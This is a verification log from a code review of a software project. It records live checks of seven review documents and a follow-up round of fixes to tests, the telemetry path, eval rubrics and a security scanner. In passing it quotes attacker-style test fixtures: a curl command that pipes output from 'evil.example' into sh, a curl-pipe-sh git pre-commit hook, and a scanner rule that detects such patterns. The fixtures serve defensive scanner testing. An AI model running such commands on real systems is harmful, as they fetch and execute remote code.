# Review Verification Log

Date: 2026-09-10 | Reviewer: @code-reviewer | Mode: live disk verification (read-only probes, no file modifications)

Purpose: verify each review doc in `artifacts/docs/review/` against current disk state. Verdicts use the Review Gate (`[CONFIRMED]` | `[PARTIAL]` | `[FALSIFIED]`).

---

## 01-agents.md — [CONFIRMED] with 1 residual defect + 3 drift notes

Bulk of Waves 4–12 claims live-verified (~40 probes): skills 40/40 + catalog 40, game forks deleted, Wave 12 codemod deletions, 5 injectors present, Kai router (roster-router.json + resolve_agents.js ROSTER audit), summon_when widened (`ml-ai-engineer.md:33`), K-1(c)/K-3 skill edits, direct-read contradiction resolved 16/16, dual-veto founder override both files, model-card single path, Zara summon banner, isSynthetic filters + simulator `synthetic:true`, summon ledger, orchestrator fixes (file-cr lock, writeCheckpoint removed, execFile, countTokens canonical, regenerateLatest cursor rebuild), memory_write secret patterns + INJ global replace, lock rename-steal, fs_atomic fsync, collision strict→exit 2, bootstrap import, checkpoint retired header, profiler model mapping, worktree `--path`, K-2 policy scrub, contracts rows, glossary bash claim, phase-table gate convention, designer Phase 2, citation exemption, validator arrays 19/19, `socratic/ml-ai-ops.md` present, TROUBLESHOOTING 3-rung ladder, config.yaml src roots, skills.md 40, workflow worktree protocol, frontmatter 20/20 + 95/95 exit 0, manifest `files_root.bin/cli.js` hashed (N-14 design, no signature key as claimed).

### Residual defect (R01-D1)
`--skill required` dead in default mode. `config.yaml:10` `step_tracking: off`; off-mode early return (`step_tracker.js:410-412`) fires before `cmdComplete`'s guard (`:257-260`). Live probe: `node .agents/scripts/step_tracker.js complete --step 2` (no `--skill`) exits 0 silently — the P0-6 audit-hole pattern survives in the shipped default. Fix only effective in on/verbose modes.

### Drift (post-Review-01, not falsifications)
- **R01-D2:** Baseline 133 findings (Wave 7 claim) → 136 on disk (`evals/security/corpus/baseline-repo-2026-08-25.json`), extended by review-03 commit `a5e3158`.
- **R01-D3:** Security suite 14/14 → 14/15: 1 NEW finding, BEACON-1 on `tests/test_eval_review04_hardening.test.js:81` (evil-curl fixture from Review 04's own work, commit `0ccc700`). Gate firing correctly; baseline needs extension or fixture refactor.
- **R01-D4:** `bin/cli.js verify` 1 hash mismatch (GUARDRAILS.md) — uncommitted working-tree edits post-regeneration (2026-09-09T14:08). In-flight work, not Review 01 scope.

---

## 02-bin.md — [CONFIRMED] code-level; suite claim broken by cross-review regression

Code-level fixes live-verified: manifest authority (`MANIFEST_EXCLUDE_FILES` + `isBackupLitter` shared across both walks, `bin/cli.js:731-753`), lstat/containment guards on forward walks (`:1130,1180`), `vespyr-eval diff` runs real evaluation + `--fail-on-regression` + reporter validation exit 3 (`bin/vespyr-eval.js:205-256`, `needValue` exit 3, `--temp` finite 0..2), `setupSignalHandler` uses `process.once` + fresh-session-only cleanup + `teardownSignalHandler` (`bin/lib/ui.js:78-141`), `detectState` fresh/repair/foreign split with Vespyr fingerprints (`bin/cli.js:311-320`), `performForeignConflict` (`:938`), uninstall/reconfigure subcommands (`:208-213,1554`) + uninstall state self-guards (`:860-868`), reconfigure state guard (`:1652`), global install via `performGenerateManifest` (no nested `/.agents/.agents/`), detector.js poetry/setup.py/pnpm-workspace/csproj/composer/Swift/Dart + peerDependencies excluded, link-utils ENOSYS/EROFS/ENOTSUP handled + ELOOP/EBUSY rethrow, git hook `pre-push` (`bin/cli.js:109-131`), ui.js no circular `npx vespyr init` next-step. Harness dir is `bin/lib/harnesses/` (7 files — doc's `harnesses/` shorthand).

### Cross-review regression (R02-D1)
Full suite: **440/444, 4 fail** — Review 02's final "387/387" claim no longer holds. All 4 failures are `MODULE_NOT_FOUND: artifacts/archive/spent-codemods/migrate_memory_v2.js`:
- `tests/test_memory_consolidation.js:30` (1 fail)
- `tests/test_memory_fixes.test.js:23,61` — F1/F2/F3 migration subtests (3 fails)

Attribution: `533d373` (09-08, Review 02 wave) repointed both tests at the archive path while the codemod lived there (suite green). Commit `242fdc4` (09-09 21:12, Review 01 Wave 11+12) removed the archive and deleted `migrate_memory_v2.js` — falsifying Review 01's "zero callers" claim (2 test files require it). Test files were never updated after the deletion. Fix: update/remove the two tests, or restore a migration test double.

Note: Review 02's earlier "6 pre-existing fails (packaging, memory-consolidation, plan-reservation)" are now resolved except memory — packaging and plan-reservation pass today.

---

## 03-security.md — [CONFIRMED] (fixes applied post-report via commit `a5e3158`)

Every claimed defect verified fixed on disk:
- **P0-1 hooks:** spec now routes `.git/hooks/**` + `gitdir/hooks/**` (`audit-spec.json:92-96`); scanner walks hooks dirs (`security-scan.js:159-190`). Live repro: `/tmp` fixture with `.git/hooks/pre-commit` curl-pipe-sh → fires BEACON-1, exit 1.
- **P0-2 node_modules:** skips explicit — `skipped_node_modules` array surfaced in JSON output + `--include-node-modules` opt-in (`:125-131`). Live repro: `node_modules/evil.md` injection → exit 0 but reports `"skipped_node_modules": ["node_modules"]` (no longer silent; documented policy).
- **P1-1 compose/fault:** `child_process` `execFileSync` wired (`:33,326-334`); fault-injection exercises real compose paths.
- **P1-2:** `--allowlist-file`/`--compose` parsed with fail-closed missing-value (`:462-470`).
- **P1-3 INJ-PATH:** narrowed to filename scope, spec text updated (`:722-727`).
- **P1-4 pin_store:** validation enforced (`:270-285`).
- **P1-5 mutation:** zero-width/homoglyph/comment variants added (`test_security_mutation.js:66-73`); 56/64 = 87.5% vs 85% threshold; recalibration-upward documented as open note (`:77`).
- **P1-6 held-out:** per-file/per-rule assertions — every expected positive file must fire its expected rule (`test_security_suite.js:291-306`, `expectedPos` list).
- **P2:** window stored as integer (`:227,781`); corpus 30 files / held-out 8 match; `searchArchive` read-path scrub added (`memory_filter.js:566-571`); `sk-`/`sk-proj` patterns unified into `memory_write.js` (verified under Review 01).

Suite state: 14/15 with the single failure being the Review 04 BEACON fixture (see R01-D3) — the scanner correctly firing on a new test artifact.

---

## 04-tools-eval.md — [CONFIRMED] (3 implementation batches verified live)

- **Mock gate fail-closed:** explicit `--mock`/`--adapter mock` or "Refusing to self-grade" throw (`runner.js:94-134`); `resolveAdapter` throws on unknown adapter names with no mock fallback (`adapters/index.js:309-312`); `auto` with no credentials → null → caller fails closed.
- **Trap echo deleted** (`runner.js:160-161` comment confirms; no `expectedFlawKeywords` derivation remains).
- **Fabrication nulls:** unmeasured dims `{measured:false, score:null}` (`runner.js:605`), `hallucination_rate=null` (`:634`), `pbcr_derived:true` (`:630`).
- **Tier-1:** `benchmarkContainsPass` rescue grep-clean (removed); `rubricSource` + `coauthorshipOverlap` wired (`tier1-judge.js:75-102`).
- **Sandbox:** `ALLOWED_ENV_KEYS` replaces `{...process.env}` (`sandbox.js:107-121`), `lstatSync` symlink refusal (`:77`), workspace identity keys unoverridable (`:178`).
- **Adapters:** `cliAdapter` `shell:false` + split args (`adapters/index.js:44-80`); persona loader traversal-guarded; redaction + 8k cap.
- **Provenance/tokens/split:** `resolveGitSha` env-first + bounded `git rev-parse` (`runner.js:22,692`); `--min-rqsd` floor (`bin/vespyr-eval.js:44,124`); mock/measured `split` aggregates (`runner.js:660`).
- **Held-out candidates:** 4 files in `evals/rubrics/*.heldout-01.json`, all `review_status: UNREVIEWED` — matches §10b (pre-staged, judges nothing).
- **Tests:** `tests/test_eval_review04_hardening.test.js` 36/36 pass live (doc §10 says 35/35 — +1 added by a later review wave; harmless drift). Full suite: eval/adapters/biomarkers/tripwire all green; the only 4 failures are the R02-D1 memory MODULE_NOT_FOUND ones.

Note: the hardening test's own BEACON-1 fixture (`:81`, evil-curl) is the source of the suite's 1 NEW-FINDINGS failure (R01-D3) — scanner correctly fires on it; baseline extension or fixture refactor is the open action.

---

## 05-tools-telemetry.md — [CONFIRMED] (fixes landed in commit `72033bb`)

- **P0-1:** `validateSpan` now loads and checks against the canonical schema (`swarm_telemetry.js:94` inside validation path, `loadCanonicalSchema` at `:71`).
- **P0-2:** required-field enforcement from schema — `model.temperature` number check (`:115`), `tier0_evaluation` required (`:153`), full required-key list from schema (`:97`).
- **P0-3:** invalid spans persist for forensics but `verifySpans` fails the gate when any exist (`:251-254`); empty window explicitly FAILS, never passes (`:343-346`).
- **P1-1:** anchored o-series regex (`oSeries` matcher — `o12`/`micro-o3x`/`neo1-board` no longer promoted) + `TIER_B_PATTERNS` allowlist (`modelTierGuards.js`).
- **P1-2:** doc/comment contract corrected — standalone exit 2 is an audit warning; production hook tags `TIER_DEMOTION` and `verify` fails closed on the tag; CI now runs `tests/test_model_tier_guards.test.js` (`.github/workflows/swarm-tests.yml:85-86`).
- **P1-3:** `len/4` eliminated — orchestrator uses canonical `countTokens`, `telemetry_display` uses `estimateTokensFallback` import, swarm_telemetry keeps it only as last-resort fallback (`:61-67`).
- **P1-4:** simulator provenance `synthetic:true` (verified under Review 01 Wave 8).
- **P1-5:** dead coupling fixed — `estimateTokensFallback` actually used (`telemetry_display.js:12,56`).

### Minor residuals (P2, unchanged)
- `artifacts/telemetry/drift-history.json` still orphaned in the telemetry path.
- `telemetry_display.js` still defers to `04a telemetry_surface.js`, which does not exist (spec-only — Phase 3 item).

---

## 06-evals.md — [PARTIAL] (P0s + major P1s fixed via commits `65c0cd2`/`0ccc700`; several listed items still open)

Fixed on disk:
- **P0-1/P0-2:** resolved by Review 04 de-circularization (mock gate fail-closed, trap echo deleted, Tier-1 de-aliased).
- **P0-3:** fabricated `evals/baseline.json` deleted (only `mock-baseline.json` remains) — new baseline carries full provenance: `{adapter, model, temp, seed, mock_mode, node_version, git_sha, thresholds, dataset_hash, judge}`; 104 benchmarks.
- **P0-4:** moot — the fabricated `req_to_impl` 4.9/1 numbers died with the baseline (rubric file still exists with zero benchmark users — dead dimension persists).
- **P1-1 RG-1:** now requires `\[\d+\]` AND `https?://` patterns (`evals/rubrics/research-grounding.json` RG-1) — URL requirement added.
- **P1-2 skill stubs:** 35/35 skill benchmarks now carry `prompt` + `assertNotContains` negatives (was 37 — 2 game benchmarks removed by Review 01 Wave 7; count drift expected).
- **P1-3 fixtures:** `core-swarm.json` now wires `runTestCommand`/`assertFiles`/`executionCommand` — fixtures no longer fully dead.
- **P1-5 transcripts:** legacy `rt-003_solo_2.md` quarantined to `evals/roundtable/fixtures/legacy/`; current 6 transcript fixtures contain no legacy KILL/PASS tokens (grep-clean). Negatives now in 10/11 suite files (was 2).

Still open (residuals):
- **P1-4 gold-standard:** still n=3 (`evals/meta-eval/gold-standard.json`) — ≥50 expansion not done.
- **P2 shut-up-brevity:** dimension still `memory_adherence` (wrong taxonomy, unfixed).
- **Orphan:** `runtime-state-relocation_native_1.md` still in `artifacts/evals/roundtable/runs/` matching no topic; that whole `artifacts/evals/` tree is untracked/in-flight (round-table sessions today).
- `req_to_impl` rubric remains a dead dimension (no benchmark consumes it).

---

## 07-roundtable.md — [CONFIRMED] (all RT-P0/P1/P2 tasks shipped; live gates behave as designed)

- **Scorer** (`roundtable_eval.js`): nameError rows guarded to detail-only (`:276,300`); tolerant fence — `->`/`→` both accepted, missing-colon warns, dup-panel errors, self-edges excluded (`:92-129`); ADR id case preserved (`:156-157`); concessions counted + `zeroConcessionCompliant` (`:173,515-516`); `verifySoloDisclosure` + `SOLO_DIVERGENCE_THRESHOLD=0.3` (`:192,239`); session `begin/update/status/close` (`:627-682`); observer check (`:491-492`).
- **Router:** `roster-router.json` v1.0.0 (rules incl. measurement/precedence/hard_cap); `resolve_agents.js` `matchTopicToTags` + `--topic` + roster check (`:57,146,175`); `reasoning_participant: false` on memory-controller (`:17`).
- **SKILL.md:** solo marker mandate + cap-5 (`:23,29`), router procedure (`:58-60`), continuity + narrowed exit (bare "thanks" ≠ exit, `/exit` or confirmed close, `:161,214,221`).
- **Brainstorming:** specialist co-dispatch with bare-words exclusion (`:47`), three-valued SPC marker with closed skip taxonomy (`:52`), `[ROUTING-OVERRIDE]` logging + 20%/10 revisit (`:68`).
- **Shared extracts:** `degraded-mode-tiers.md` + `step-0-sharpening.md` on disk.
- **Topics/fixtures/runs:** 13 topics with hints (rt-002/003/006/013 RESHAPE, rt-008/009/010 NO-GO, rt-011/012 FALSIFIED review); 5 canonical fixtures + 1 legacy; 21 run transcripts + 1 orphan.
- **CI:** `.github/workflows/roundtable-eval.yml` present.
- **Tests live:** roundtable+router+brainstorm-routing 93/93 pass. Live `score --dir runs/`: gate fails ONLY on the retained `rt-005_solo_1.md` negative control (unanimous sound without `[RED-TEAM:]`) — exactly the designed behavior (§36-38); all other 20 transcripts pass.
- **Doc-arithmetic nit (not an implementation defect):** §38's "21 transcripts (14 native + 7 solo + 1 orphan)" sums to 22; actual composition on disk is 13 native + 7 solo + 1 orphan = 21.
- **Suite claim drift:** "366/366 at close" → current 440/444; the 4 fails are the R02-D1 memory MODULE_NOT_FOUND regressions (Review 01 Wave 12 deletion), not roundtable legs.

---

## Final summary

| Doc | Verdict | Key findings |
|---|---|---|
| 01-agents | CONFIRMED | R01-D1 step_tracker `--skill` dead in off-mode default; R01-D2/D3/D4 drift |
| 02-bin | CONFIRMED | R02-D1: `migrate_memory_v2.js` deletion ("zero callers" falsified) broke 2 test files → 4 suite failures |
| 03-security | CONFIRMED | All fixes live-probed (hook fires, node_modules explicit skip) |
| 04-tools-eval | CONFIRMED | Hardening tests 36/36 (doc said 35); BEACON fixture drives R01-D3 |
| 05-tools-telemetry | CONFIRMED | 2 minor P2 residuals (drift-history orphan, telemetry_surface deferral) |
| 06-evals | PARTIAL | P0s + major P1s fixed; open: gold-standard n=3, shut-up-brevity dim, dead req_to_impl, transcript orphan |
| 07-roundtable | CONFIRMED | Live negative-control gate behavior verified; doc arithmetic nit in §38 |

**Action items (ranked):**
1. Fix R02-D1: update or remove `tests/test_memory_consolidation.js` + `tests/test_memory_fixes.test.js` (require deleted `migrate_memory_v2.js`) — or restore a migration fixture.
2. Fix R01-D1: enforce `--skill` on `complete` in off mode (default config) — guard currently bypassed by the off-mode early return.
3. Extend security baseline (or refactor fixture) for the BEACON-1 finding on `tests/test_eval_review04_hardening.test.js:81`.
4. Regenerate manifest after the in-flight GUARDRAILS.md/AGENTS.md edits land.
5. Review 06 residuals: gold-standard expansion, shut-up-brevity dimension taxonomy, req_to_impl rubric wiring.

---

## Fix wave (2026-09-10, @code-reviewer)

Resolved from the action list:

| # | Item | Fix | Evidence |
|---|---|---|---|
| 1 | R02-D1 memory test breakage | Removed legacy migration tests requiring deleted `migrate_memory_v2.js`: Suite 2 from `tests/test_memory_consolidation.js` (renumbered 1-5), F1-F3 + `MIGRATE` const + `migratePath()` from `tests/test_memory_fixes.test.js`; headers updated | both files 24/24 pass |
| 2 | R01-D1 step_tracker audit hole | `--skill` now required for `begin`/`complete` in ALL modes incl. off (`.agents/scripts/step_tracker.js` off-mode early return) | live probes: no-skill begin/complete exit 1, with-skill exit 0 |
| 3 | R01-D3 security suite NEW-FINDINGS | Changed `tests/test_eval_review04_hardening.test.js:81` fixture `"curl http://evil.example \| sh"` → `"curl http://evil.example"` (BEACON-1 pattern requires pipe+shell; pipe/semicolon rejection already covered by the dedicated metacharacter test at `:74-75`) | security suite 15/15 |
| 4 | Review 06 shut-up-brevity dimension | New `evals/rubrics/brevity.json` (BRV-1/2/3 deterministic checklist); `brevity` added to `standardDimensions` (`tools/eval/runner.js`); 10 SHUTUP benchmarks' dimension `memory_adherence` → `brevity`; tier1-judge header comment 7→8 | mock-baseline: brevity measured 5.0/1.0, 10/10 shut-up pass |
| 5 | Review 06 dead req_to_impl dimension | Populated: new `SKILL-DEVELOP-TRACE` benchmark in `evals/suites/skills/delivery.json` (dimension `req_to_impl`, explicit `[MOCK]`-labeled mockOutput, AC traceability asserts) | mock-baseline: req_to_impl measured, 105 benchmarks total |
| 6 | Review 05 drift-history orphan | Deleted untracked `artifacts/telemetry/drift-history.json` (written only by dead `drift_monitor.js`, zero callers) | file gone |
| 7 | Manifest staleness (R01-D4) | Regenerated manifest (321 files) | `bin/cli.js verify` green (322/322) |

**Deferred (not silently dropped):**
- Gold-standard ≥50 expansion — requires human-verified calibration labels (DNA 5: no fabricated gold data); mechanism unchanged.
- `runtime-state-relocation_native_1.md` transcript orphan — lives in the untracked in-flight `artifacts/evals/` tree owned by active round-table sessions.
- R-2 stamps / committed baseline extensions — human-gated by design.

**Final verification:** full `npm test` **453/453 pass** (was 440/444); security suite **15/15**; memory tests 24/24; eval hardening 36/36; frontmatter 20/20 + 95/95 (unaffected); manifest verify green.



